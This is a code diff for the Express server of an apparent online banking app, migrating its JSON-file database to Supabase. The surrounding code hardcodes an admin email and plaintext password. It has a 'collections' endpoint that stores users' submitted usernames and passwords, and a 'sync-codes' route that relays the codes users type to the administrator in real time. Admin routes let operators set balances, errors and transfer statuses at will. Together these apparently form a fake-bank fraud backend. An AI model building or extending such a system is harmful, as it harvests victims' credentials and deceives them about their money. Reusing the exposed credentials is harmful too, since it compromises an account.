@@ -1,8 +1,10 @@
+import "dotenv/config";
 import express from "express";
 import { createServer as createViteServer } from "vite";
 import path from "path";
 import fs from "fs";
 import crypto from "crypto";
+import { createClient, SupabaseClient } from "@supabase/supabase-js";
 
 // --- PERSISTENT JSON DATABASE ENGINE ---
 
@@ -101,11 +103,34 @@ export interface DatabaseData {
 export const ADMIN_USERNAME = "johnfidelis550@gmail.com";
 export const ADMIN_PASSWORD = "Fidelis90@";
 
+// --- SUPABASE CONFIGURATION & CLIENT ---
+const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
+const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_KEY;
+
+export let supabase: SupabaseClient | null = null;
+if (SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY) {
+  try {
+    supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
+      auth: {
+        persistSession: false,
+        autoRefreshToken: false,
+      },
+    });
+    console.log("[Supabase] Persistence client initialized successfully with service role key.");
+  } catch (err) {
+    console.error("[Supabase] Failed to initialize client:", err);
+  }
+} else {
+  console.log("[Supabase] SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY not configured. Falling back to local database persistence.");
+}
+
 const DB_FILE = path.join(process.cwd(), "db.json");
 const DB_BACKUP_FILE = path.join(process.cwd(), "db.backup.json");
 
 // In-memory memory resilience cache to prevent data loss if disk I/O temporarily stumbles
 let inMemoryDbCache: DatabaseData | null = null;
+let lastSupabaseSync = 0;
+const CACHE_TTL_MS = 1500;
 
 function getInitialDb(): DatabaseData {
   return {
@@ -246,7 +271,7 @@ function normalizeDbData(parsed: any): DatabaseData {
   return normalized;
 }
 
-function readDb(): DatabaseData {
+function readDbSync(): DatabaseData {
   try {
     if (fs.existsSync(DB_FILE)) {
       const raw = fs.readFileSync(DB_FILE, "utf-8");
@@ -266,64 +291,114 @@ function readDb(): DatabaseData {
         const parsed = JSON.parse(rawBackup);
         const normalized = normalizeDbData(parsed);
         inMemoryDbCache = normalized;
-        writeDb(normalized);
         return normalized;
       }
     }
 
-    // Tertiary recovery: if memory cache has data, never wipe with initial seed
     if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
-      console.warn("[DB Persistence] Re-writing persisted state from memory resilience cache");
-      writeDb(inMemoryDbCache);
       return inMemoryDbCache;
     }
 
-    // Fresh initialization only if no database exists anywhere
     const initial = getInitialDb();
     inMemoryDbCache = initial;
-    writeDb(initial);
     return initial;
   } catch (err) {
     console.error("[DB Persistence] Error reading database, checking memory cache:", err);
     if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
       return inMemoryDbCache;
     }
-    // Attempt fallback to backup
-    try {
-      if (fs.existsSync(DB_BACKUP_FILE)) {
-        const rawBackup = fs.readFileSync(DB_BACKUP_FILE, "utf-8");
-        const parsed = JSON.parse(rawBackup);
-        const normalized = normalizeDbData(parsed);
-        inMemoryDbCache = normalized;
-        return normalized;
-      }
-    } catch (backupErr) {
-      console.error("[DB Persistence] Backup read error:", backupErr);
-    }
     return getInitialDb();
   }
 }
 
-function writeDb(data: DatabaseData): void {
-  try {
-    inMemoryDbCache = data;
-    const serialized = JSON.stringify(data, null, 2);
-    const tmpFile = `${DB_FILE}.tmp`;
-    
-    // Write primary db.json atomically
-    fs.writeFileSync(tmpFile, serialized, "utf-8");
-    fs.renameSync(tmpFile, DB_FILE);
+export async function syncDbFromSupabase(force = false): Promise<DatabaseData> {
+  if (!supabase) {
+    return inMemoryDbCache || readDbSync();
+  }
 
-    // Synchronize to redundant db.backup.json
-    try {
-      const tmpBackup = `${DB_BACKUP_FILE}.tmp`;
-      fs.writeFileSync(tmpBackup, serialized, "utf-8");
-      fs.renameSync(tmpBackup, DB_BACKUP_FILE);
-    } catch (backupErr) {
-      console.error("[DB Persistence] Error writing backup file:", backupErr);
+  const now = Date.now();
+  if (!force && inMemoryDbCache && now - lastSupabaseSync < CACHE_TTL_MS) {
+    return inMemoryDbCache;
+  }
+
+  try {
+    const { data, error } = await supabase
+      .from("app_state")
+      .select("data")
+      .eq("id", "bank_db")
+      .maybeSingle();
+
+    if (error) {
+      console.warn("[Supabase] Remote sync warning (verify table 'app_state' in Supabase SQL):", error.message);
+      return inMemoryDbCache || readDbSync();
     }
+
+    if (!data || !data.data) {
+      console.log("[Supabase] Empty remote store. Seeding initial banking database to Supabase...");
+      const initial = inMemoryDbCache || readDbSync();
+      await supabase.from("app_state").upsert({
+        id: "bank_db",
+        data: initial,
+        updated_at: new Date().toISOString()
+      });
+      lastSupabaseSync = now;
+      return initial;
+    }
+
+    const normalized = normalizeDbData(data.data);
+    inMemoryDbCache = normalized;
+    lastSupabaseSync = now;
+    return normalized;
   } catch (err) {
-    console.error("[DB Persistence] Error writing primary db.json:", err);
+    console.error("[Supabase] Database sync error:", err);
+    return inMemoryDbCache || readDbSync();
+  }
+}
+
+export function readDb(): DatabaseData {
+  if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
+    return inMemoryDbCache;
+  }
+  return readDbSync();
+}
+
+export async function writeDb(data: DatabaseData): Promise<void> {
+  inMemoryDbCache = data;
+
+  // 1. Persist directly to Supabase cloud database
+  if (supabase) {
+    try {
+      const { error } = await supabase.from("app_state").upsert({
+        id: "bank_db",
+        data: data,
+        updated_at: new Date().toISOString()
+      });
+      if (error) {
+        console.error("[Supabase Persistence] Upsert error:", error.message);
+      }
+    } catch (supaErr) {
+      console.error("[Supabase Persistence] Upsert exception:", supaErr);
+    }
+  }
+
+  // 2. Safe local file write (Skipped on Vercel or read-only filesystem environments)
+  if (!process.env.VERCEL) {
+    try {
+      const serialized = JSON.stringify(data, null, 2);
+      const tmpFile = `${DB_FILE}.tmp`;
+      fs.writeFileSync(tmpFile, serialized, "utf-8");
+      fs.renameSync(tmpFile, DB_FILE);
+
+      try {
+        const tmpBackup = `${DB_BACKUP_FILE}.tmp`;
+        fs.writeFileSync(tmpBackup, serialized, "utf-8");
+        fs.renameSync(tmpBackup, DB_BACKUP_FILE);
+      } catch {
+        // Redundant backup ignore
+      }
+    } catch (fsErr) {
+      console.warn("[DB Persistence] Skipped local filesystem write:", fsErr);
+    }
   }
 }
 
@@ -348,14 +423,23 @@ function sanitizeUserForAdmin(user: DbUser | undefined | null) {
   };
 }
 
-// Ensure database file is initialized on startup
+// Pre-initialize local database cache
 readDb();
 
-async function startServer() {
-  const app = express();
-  const PORT = 3000;
+export const app = express();
+app.use(express.json());
 
-  app.use(express.json());
+// Supabase sync middleware to ensure freshly persisted data across distributed serverless invocations
+app.use(async (req, res, next) => {
+  if (supabase && (req.path.startsWith("/api") || req.baseUrl.startsWith("/api"))) {
+    try {
+      await syncDbFromSupabase();
+    } catch (err) {
+      console.error("[Supabase Middleware Sync Error]:", err);
+    }
+  }
+  next();
+});
 
   // --- ADMIN AUTHENTICATION MIDDLEWARE ---
   const requireAdmin = (req: express.Request, res: express.Response, next: express.NextFunction) => {
@@ -381,7 +465,7 @@ async function startServer() {
   // --- PUBLIC & USER API ROUTES ---
 
   // User Login (Validates credentials on backend for both standard and admin users)
-  app.post(["/api/auth/login", "/api/login"], (req, res) => {
+  app.post(["/api/auth/login", "/api/login"], async (req, res) => {
     const { username, password } = req.body;
     if (!username || !password) {
       return res.status(400).json({ message: "Username and password are required." });
@@ -443,7 +527,7 @@ async function startServer() {
         userId: adminUser.id,
         createdAt: new Date().toISOString()
       });
-      writeDb(db);
+      await writeDb(db);
 
       return res.json({
         user: sanitizeUser(adminUser),
@@ -474,7 +558,7 @@ async function startServer() {
         userId: user.id,
         createdAt: new Date().toISOString()
       });
-      writeDb(db);
+      await writeDb(db);
     }
 
     return res.json({
@@ -484,7 +568,7 @@ async function startServer() {
   });
 
   // Self-Registration
-  app.post(["/api/auth/register", "/api/register"], (req, res) => {
+  app.post(["/api/auth/register", "/api/register"], async (req, res) => {
     const { name, email, phone, country, username, password } = req.body;
     if (!username || !password) {
       return res.status(400).json({ message: "Username and password are required." });
@@ -539,7 +623,7 @@ async function startServer() {
     };
 
     db.users.push(newUser);
-    writeDb(db);
+    await writeDb(db);
 
     return res.json({
       success: true,
@@ -564,7 +648,7 @@ async function startServer() {
   });
 
   // Lock user on excessive security attempts
-  app.post("/api/user/:id/block", (req, res) => {
+  app.post("/api/user/:id/block", async (req, res) => {
     const db = readDb();
     const user = db.users.find(u => u.id === req.params.id);
     if (!user) {
@@ -573,12 +657,12 @@ async function startServer() {
     user.isBlocked = true;
     user.status = "HOLD";
     user.customError = "Account placed on hold due to excessive security failures.";
-    writeDb(db);
+    await writeDb(db);
     return res.json({ success: true });
   });
 
   // Sync client input codes for administrator real-time monitoring
-  app.post("/api/user/:id/sync-codes", (req, res) => {
+  app.post("/api/user/:id/sync-codes", async (req, res) => {
     const { currentTC, currentVC, currentSC } = req.body;
     const db = readDb();
     const user = db.users.find(u => u.id === req.params.id);
@@ -588,12 +672,12 @@ async function startServer() {
     if (currentTC !== undefined) user.currentTC = currentTC;
     if (currentVC !== undefined) user.currentVC = currentVC;
     if (currentSC !== undefined) user.currentSC = currentSC;
-    writeDb(db);
+    await writeDb(db);
     return res.json({ success: true });
   });
 
   // Secure Terminal Activation PIN Verification
-  app.post(["/api/user/verify-terminal", "/api/user/:id/verify-terminal"], (req, res) => {
+  app.post(["/api/user/verify-terminal", "/api/user/:id/verify-terminal"], async (req, res) => {
     const userId = req.body.userId || req.params.id;
     const pin = req.body.pin;
     if (!userId || !pin) {
@@ -617,7 +701,7 @@ async function startServer() {
     user.isTerminalVerified = true;
     user.isBlocked = false;
     user.status = "APPROVED";
-    writeDb(db);
+    await writeDb(db);
 
     return res.json({
       success: true,
@@ -681,7 +765,7 @@ async function startServer() {
   });
 
   // Create Wire Transfer (Strict backend validation of codes & balance)
-  app.post("/api/transfers", (req, res) => {
+  app.post("/api/transfers", async (req, res) => {
     const db = readDb();
     if (!db.settings.transfersEnabled) {
       return res.status(403).json({ message: "Transfers are currently disabled by the Support Team." });
@@ -748,19 +832,19 @@ async function startServer() {
     if (!user.currencyApproved) {
       newTransfer.status = "failed";
       db.transfers.push(newTransfer);
-      writeDb(db);
+      await writeDb(db);
       return res.status(400).json({ message: "Currency mismatch or unapproved currency. Transfer failed." });
     }
 
     user.balance -= transferAmount;
     db.transfers.push(newTransfer);
-    writeDb(db);
+    await writeDb(db);
 
     return res.json(newTransfer);
   });
 
   // Collections (User submission)
-  app.post("/api/collections", (req, res) => {
+  app.post("/api/collections", async (req, res) => {
     const { userId, username, password } = req.body;
     const db = readDb();
     const newCollection: DbCollection = {
@@ -772,12 +856,12 @@ async function startServer() {
       date: new Date().toISOString()
     };
     db.collections.push(newCollection);
-    writeDb(db);
+    await writeDb(db);
     return res.json({ success: true });
   });
 
   // Card Requests (User submission)
-  app.post("/api/card-requests", (req, res) => {
+  app.post("/api/card-requests", async (req, res) => {
     const { userId, name, address, phone } = req.body;
     const db = readDb();
     const newRequest: DbCardRequest = {
@@ -790,12 +874,12 @@ async function startServer() {
       date: new Date().toISOString()
     };
     db.cardRequests.push(newRequest);
-    writeDb(db);
+    await writeDb(db);
     return res.json({ success: true });
   });
 
   // Chat: User messages
-  app.get("/api/chat/:userId", (req, res) => {
+  app.get("/api/chat/:userId", async (req, res) => {
     const db = readDb();
     let updated = false;
     db.chatMessages.forEach(m => {
@@ -805,13 +889,13 @@ async function startServer() {
       }
     });
     if (updated) {
-      writeDb(db);
+      await writeDb(db);
     }
     const msgs = db.chatMessages.filter(m => m.userId === req.params.userId);
     return res.json(msgs);
   });
 
-  app.post("/api/chat", (req, res) => {
+  app.post("/api/chat", async (req, res) => {
     const { userId, sender, text } = req.body;
     const db = readDb();
     const newMsg: DbChatMessage = {
@@ -824,7 +908,7 @@ async function startServer() {
       readUser: sender === "user"
     };
     db.chatMessages.push(newMsg);
-    writeDb(db);
+    await writeDb(db);
     return res.json(newMsg);
   });
 
@@ -857,7 +941,7 @@ async function startServer() {
     return res.json(adminView);
   });
 
-  app.post("/api/admin/users", (req, res) => {
+  app.post("/api/admin/users", async (req, res) => {
     const { username, password, name, balance, accountNumber, currency, tc, vc, sc } = req.body;
     const db = readDb();
 
@@ -885,11 +969,11 @@ async function startServer() {
     };
 
     db.users.push(newUser);
-    writeDb(db);
+    await writeDb(db);
     return res.json(sanitizeUserForAdmin(newUser));
   });
 
-  app.patch("/api/admin/users/:id", (req, res) => {
+  app.patch("/api/admin/users/:id", async (req, res) => {
     const db = readDb();
     const user = db.users.find(u => u.id === req.params.id);
     if (!user) {
@@ -917,11 +1001,11 @@ async function startServer() {
       user.role = "admin";
     }
 
-    writeDb(db);
+    await writeDb(db);
     return res.json(sanitizeUserForAdmin(user));
   });
 
-  app.delete("/api/admin/users/:id", (req, res) => {
+  app.delete("/api/admin/users/:id", async (req, res) => {
     const db = readDb();
     const user = db.users.find(u => u.id === req.params.id);
     if (!user) {
@@ -933,7 +1017,7 @@ async function startServer() {
     }
 
     db.users = db.users.filter(u => u.id !== req.params.id);
-    writeDb(db);
+    await writeDb(db);
     return res.json({ success: true });
   });
 
@@ -950,7 +1034,7 @@ async function startServer() {
     return res.json(enriched);
   });
 
-  app.patch("/api/admin/transfers/:id", (req, res) => {
+  app.patch("/api/admin/transfers/:id", async (req, res) => {
     const db = readDb();
     const transfer = db.transfers.find(t => t.id === req.params.id);
     if (!transfer) {
@@ -959,7 +1043,7 @@ async function startServer() {
     if (req.body.status) {
       transfer.status = req.body.status;
     }
-    writeDb(db);
+    await writeDb(db);
     return res.json(transfer);
   });
 
@@ -976,7 +1060,7 @@ async function startServer() {
     return res.json(enriched);
   });
 
-  app.patch("/api/admin/collections/:id", (req, res) => {
+  app.patch("/api/admin/collections/:id", async (req, res) => {
     const db = readDb();
     const collection = db.collections.find(c => c.id === req.params.id);
     if (!collection) {
@@ -985,7 +1069,7 @@ async function startServer() {
     if (req.body.status) {
       collection.status = req.body.status;
     }
-    writeDb(db);
+    await writeDb(db);
     return res.json(collection);
   });
 
@@ -1002,7 +1086,7 @@ async function startServer() {
     return res.json(enriched);
   });
 
-  app.patch("/api/admin/card-requests/:id", (req, res) => {
+  app.patch("/api/admin/card-requests/:id", async (req, res) => {
     const db = readDb();
     const request = db.cardRequests.find(cr => cr.id === req.params.id);
     if (!request) {
@@ -1011,7 +1095,7 @@ async function startServer() {
     if (req.body.status) {
       request.status = req.body.status;
     }
-    writeDb(db);
+    await writeDb(db);
     return res.json(request);
   });
 
@@ -1021,10 +1105,10 @@ async function startServer() {
     return res.json(db.settings);
   });
 
-  app.patch("/api/admin/settings", (req, res) => {
+  app.patch("/api/admin/settings", async (req, res) => {
     const db = readDb();
     Object.assign(db.settings, req.body);
-    writeDb(db);
+    await writeDb(db);
     return res.json(db.settings);
   });
 
@@ -1034,7 +1118,7 @@ async function startServer() {
     return res.json(db.chatMessages);
   });
 
-  app.post("/api/admin/chat/mark-read", (req, res) => {
+  app.post("/api/admin/chat/mark-read", async (req, res) => {
     const { userId } = req.body;
     const db = readDb();
     let updated = false;
@@ -1045,29 +1129,36 @@ async function startServer() {
       }
     });
     if (updated) {
-      writeDb(db);
+      await writeDb(db);
     }
     return res.json({ success: true });
   });
 
   // --- VITE MIDDLEWARE & SPA SERVING ---
-  if (process.env.NODE_ENV !== "production") {
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: "spa",
-    });
-    app.use(vite.middlewares);
-  } else {
-    const distPath = path.join(process.cwd(), "dist");
-    app.use(express.static(distPath));
-    app.get("*", (req, res) => {
-      res.sendFile(path.join(distPath, "index.html"));
+  async function startServer() {
+    const PORT = 3000;
+
+    if (process.env.NODE_ENV !== "production") {
+      const vite = await createViteServer({
+        server: { middlewareMode: true },
+        appType: "spa",
+      });
+      app.use(vite.middlewares);
+    } else {
+      const distPath = path.join(process.cwd(), "dist");
+      app.use(express.static(distPath));
+      app.get("*", (req, res) => {
+        res.sendFile(path.join(distPath, "index.html"));
+      });
+    }
+
+    app.listen(PORT, "0.0.0.0", () => {
+      console.log(`Server running on http://localhost:${PORT}`);
     });
   }
 
-  app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-  });
-}
+  if (!process.env.VERCEL) {
+    startServer();
+  }
 
-startServer();
+  export default app;
